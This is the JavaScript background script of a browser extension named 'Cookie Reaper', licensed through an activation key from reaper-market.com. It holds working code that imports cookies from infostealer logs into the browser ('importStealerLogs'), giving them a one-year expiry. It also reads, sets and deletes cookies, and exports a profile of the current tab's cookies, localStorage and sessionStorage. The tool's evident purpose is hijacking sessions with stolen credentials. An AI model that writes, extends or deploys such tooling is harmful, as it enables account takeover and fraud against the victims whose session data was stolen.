import { BrowserDetector } from './interface/lib/browserDetector.js';
import { Browsers } from './interface/lib/browsers.js';
import { PermissionHandler } from './interface/lib/permissionHandler.js';

console.log('Cookie Reaper - Device Emulator starting...');
const connections = {};
const browserDetector = new BrowserDetector();
const permissionHandler = new PermissionHandler(browserDetector);

// Activation key verification
const ACTIVATION_ENDPOINT = 'https://reaper-market.com/api/verify-key';
let isActivated = false;
let userProfile = null;

// Check activation status on startup
checkActivationStatus();

// Handle extension icon click to show appropriate popup
chrome.action.onClicked.addListener(async (tab) => {
  const result = await chrome.storage.local.get(['firstLaunchSeen', 'activationKey']);
  
  if (!result.firstLaunchSeen) {
    // First time launch - show welcome popup
    await chrome.action.setPopup({ popup: 'interface/popup/first-launch-popup.html' });
  } else if (!result.activationKey) {
    // Seen before but no activation key - show activation popup
    await chrome.action.setPopup({ popup: 'interface/popup/cookie-reaper-popup.html' });
  } else {
    // Has activation key - show main popup
    await chrome.action.setPopup({ popup: 'interface/popup/cookie-reaper-popup.html' });
  }
});

async function checkActivationStatus() {
  const storedKey = await chrome.storage.local.get(['activationKey', 'userProfile']);
  
  if (storedKey.activationKey) {
    try {
      const response = await fetch(ACTIVATION_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          key: storedKey.activationKey,
          extensionId: chrome.runtime.id
        })
      });
      
      if (response.ok) {
        const data = await response.json();
        isActivated = true;
        userProfile = data.userProfile;
        console.log('Cookie Reaper activated for user:', userProfile.username);
      } else {
        console.log('Invalid activation key');
        isActivated = false;
      }
    } catch (error) {
      console.error('Activation check failed:', error);
      isActivated = false;
    }
  }
}

// Chrome service worker setup
if (browserDetector.supportsSidePanel()) {
  browserDetector
    .getApi()
    .sidePanel.setPanelBehavior({ openPanelOnActionClick: false })
    .catch(error => {
      console.error(error);
    });
}

// Setting up event listeners
browserDetector.getApi().runtime.onConnect.addListener(onConnect);
browserDetector.getApi().runtime.onMessage.addListener(handleMessage);
browserDetector.getApi().tabs.onUpdated.addListener(onTabsChanged);

if (!browserDetector.isSafari()) {
  browserDetector.getApi().cookies.onChanged.addListener(onCookiesChanged);
}

function onConnect(port) {
  console.log('Cookie Reaper connection established');
  connections[port.name] = port;
  port.onDisconnect.addListener(() => {
    delete connections[port.name];
  });
}

function onTabsChanged(tabId, changeInfo, tab) {
  if (changeInfo.status === 'complete' && tab.url) {
    Object.values(connections).forEach(port => {
      port.postMessage({
        type: 'tabUpdated',
        tabId: tabId,
        url: tab.url
      });
    });
  }
}

function onCookiesChanged(changeInfo) {
  Object.values(connections).forEach(port => {
    port.postMessage({
      type: 'cookieChanged',
      changeInfo: changeInfo
    });
  });
}

async function handleMessage(request, sender, sendResponse) {
  console.log('Cookie Reaper message received: ' + (request.type || 'unknown'));
  
  // Check activation for sensitive operations
  if (request.type !== 'checkActivation' && request.type !== 'activate' && !isActivated) {
    sendResponse({ error: 'Extension not activated. Please enter your activation key from reaper-market.com' });
    return true;
  }
  
  switch (request.type) {
    case 'checkActivation': {
      sendResponse({ 
        activated: isActivated, 
        userProfile: userProfile,
        marketplaceUrl: 'https://reaper-market.com'
      });
      return true;
    }
    
    case 'activate': {
      const { activationKey } = request.params;
      try {
        const response = await fetch(ACTIVATION_ENDPOINT, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            key: activationKey,
            extensionId: chrome.runtime.id
          })
        });
        
        if (response.ok) {
          const data = await response.json();
          isActivated = true;
          userProfile = data.userProfile;
          await chrome.storage.local.set({ 
            activationKey: activationKey,
            userProfile: userProfile
          });
          sendResponse({ success: true, userProfile: userProfile });
        } else {
          sendResponse({ error: 'Invalid activation key' });
        }
      } catch (error) {
        sendResponse({ error: 'Activation failed: ' + error.message });
      }
      return true;
    }
    
    case 'getTabs': {
      browserDetector.getApi().tabs.query({}, function (tabs) {
        sendResponse(tabs);
      });
      return true;
    }
    
    case 'getCurrentTab': {
      browserDetector
        .getApi()
        .tabs.query(
          { active: true, currentWindow: true },
          function (tabInfo) {
            sendResponse(tabInfo);
          }
        );
      return true;
    }
    
    case 'getAllCookies': {
      const getAllCookiesParams = {
        url: request.params.url,
      };
      if (browserDetector.supportsPromises()) {
        browserDetector
          .getApi()
          .cookies.getAll(getAllCookiesParams)
          .then(sendResponse);
      } else {
        browserDetector
          .getApi()
          .cookies.getAll(getAllCookiesParams, sendResponse);
      }
      return true;
    }
    
    case 'saveCookie': {
      const saveCookieParams = {
        url: request.params.url,
        name: request.params.name,
        value: request.params.value,
        domain: request.params.domain,
        path: request.params.path,
        secure: request.params.secure,
        httpOnly: request.params.httpOnly,
        sameSite: request.params.sameSite,
        expirationDate: request.params.expirationDate,
      };
      
      if (browserDetector.supportsPromises()) {
        browserDetector
          .getApi()
          .cookies.set(saveCookieParams)
          .then(sendResponse)
          .catch(error => {
            sendResponse({ error: error.message });
          });
      } else {
        browserDetector
          .getApi()
          .cookies.set(saveCookieParams, sendResponse);
      }
      return true;
    }
    
    case 'deleteCookie': {
      const deleteCookieParams = {
        url: request.params.url,
        name: request.params.name,
        storeId: request.params.storeId,
      };
      
      if (browserDetector.supportsPromises()) {
        browserDetector
          .getApi()
          .cookies.remove(deleteCookieParams)
          .then(sendResponse)
          .catch(error => {
            sendResponse({ error: error.message });
          });
      } else {
        browserDetector
          .getApi()
          .cookies.remove(deleteCookieParams, sendResponse);
      }
      return true;
    }
    
    case 'getCookieStores': {
      if (browserDetector.supportsPromises()) {
        browserDetector
          .getApi()
          .cookies.getAllCookieStores()
          .then(sendResponse);
      } else {
        browserDetector
          .getApi()
          .cookies.getAllCookieStores(sendResponse);
      }
      return true;
    }
    
    case 'importStealerLogs': {
      try {
        const { logs } = request.params;
        let importedCount = 0;
        
        for (const log of logs) {
          if (log.cookies && Array.isArray(log.cookies)) {
            for (const cookie of log.cookies) {
              try {
                await browserDetector.getApi().cookies.set({
                  url: log.url || 'https://' + cookie.domain,
                  name: cookie.name,
                  value: cookie.value,
                  domain: cookie.domain,
                  path: cookie.path || '/',
                  secure: cookie.secure || false,
                  httpOnly: cookie.httpOnly || false,
                  sameSite: cookie.sameSite || 'no_restriction',
                  expirationDate: cookie.expirationDate || (Date.now() / 1000) + (365 * 24 * 60 * 60)
                });
                importedCount++;
              } catch (error) {
                console.error('Failed to import cookie:', cookie, error);
              }
            }
          }
        }
        
        sendResponse({ 
          success: true, 
          importedCount: importedCount,
          message: `Successfully imported ${importedCount} cookies from stealer logs`
        });
      } catch (error) {
        sendResponse({ error: 'Import failed: ' + error.message });
      }
      return true;
    }
    
    case 'exportDeviceProfile': {
      try {
        const currentTab = await browserDetector.getApi().tabs.query({ active: true, currentWindow: true });
        const cookies = await browserDetector.getApi().cookies.getAll({ url: currentTab[0].url });
        
        const deviceProfile = {
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          url: currentTab[0].url,
          cookies: cookies,
          localStorage: await getLocalStorage(currentTab[0].url),
          sessionStorage: await getSessionStorage(currentTab[0].url)
        };
        
        sendResponse({ success: true, deviceProfile: deviceProfile });
      } catch (error) {
        sendResponse({ error: 'Export failed: ' + error.message });
      }
      return true;
    }
    
    default:
      console.warn('Unknown message type:', request.type);
      return false;
  }
}

async function getLocalStorage(url) {
  try {
    const tab = await browserDetector.getApi().tabs.query({ active: true, currentWindow: true });
    const results = await browserDetector.getApi().scripting.executeScript({
      target: { tabId: tab[0].id },
      func: () => {
        const data = {};
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          data[key] = localStorage.getItem(key);
        }
        return data;
      }
    });
    return results[0].result;
  } catch (error) {
    console.error('Failed to get localStorage:', error);
    return {};
  }
}

async function getSessionStorage(url) {
  try {
    const tab = await browserDetector.getApi().tabs.query({ active: true, currentWindow: true });
    const results = await browserDetector.getApi().scripting.executeScript({
      target: { tabId: tab[0].id },
      func: () => {
        const data = {};
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          data[key] = sessionStorage.getItem(key);
        }
        return data;
      }
    });
    return results[0].result;
  } catch (error) {
    console.error('Failed to get sessionStorage:', error);
    return {};
  }
}
